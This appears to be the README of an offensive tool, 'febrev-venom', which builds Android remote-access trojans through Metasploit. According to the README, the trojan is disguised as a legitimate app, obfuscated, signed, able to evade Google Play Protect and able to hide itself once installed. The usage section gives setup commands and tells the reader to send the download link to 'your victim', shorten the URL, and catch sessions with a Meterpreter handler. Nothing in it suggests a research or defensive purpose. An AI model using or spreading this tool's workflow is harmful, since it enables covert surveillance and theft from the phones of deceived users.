# NEW VERSION 3.0
# Febrev-venom updated to version 3.0
# Added a new functionality found by me i.e, it will disappear itself after installation 

FEBREV venom(also called febrev-droidspy) is a tool to create android RATs through metasploit,changes the icon,package name, Obfuscates the Apk , Makes it look like a legit app , signs the RAT apk ,  and send it to the victim via a link url over the INTERNET
IT CAN BYPASS GOOGLE PLAY PROTECT.............
ALSO THE APP CREATED BY MY TOOL CAN AUTOMATICALLY DISAPPEAR AFTER INSTALLING


**must run as root
**must run in debian-based linux distro like kali

## USAGE:
   
   come into the febrev-venom directory 
  
   chmod +x * 
   
   python3 installer.py
   
   now you can run febrev venom anywhere from the terminal by typing the command >>  febrev
   
   
   (OR)
    come into the febrev-venom directory  
    then    
    
   python3 febrev-venom.py
   
   
 # use the generated link(the best) + /<your apk> and send it to your victim 
 then start your msfconsole 
 use exploit/multi/handler
 then set lhost and lport and start the meterpreter session
   
 # OR simply use the resource script generated automatically by the tool
   -> msfconsole -r <appname_listener.rc>
 # You can shorten the URL by :
    1.open another terminal without closing the current one
    2.copy the URL from the current terminal and type -> php shorturl.php <the copied url>
 
 
 # happy hacking.....!!!!!
 
 ################################################################################################################
   
